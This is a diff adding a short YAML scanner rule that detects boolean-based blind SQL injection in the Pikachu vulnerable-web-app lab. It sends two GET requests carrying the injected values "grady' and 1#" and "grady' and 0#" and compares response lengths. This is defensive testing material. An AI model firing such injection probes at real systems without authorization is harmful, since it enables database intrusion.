@@ -1,0 +1,14 @@
+name: sql-boolian-pikachu-get
+type: SQLI
+rules:
+  - method: GET
+    path: vul/sqli/sqli_blind_b.php?name=grady' and 1#
+    headers:
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101
+    expression: result.length()
+  - method: GET
+    path: vul/sqli/sqli_blind_b.php?name=grady' and 0#
+    headers:
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101
+    expression: result.length()
+author: ch4ser
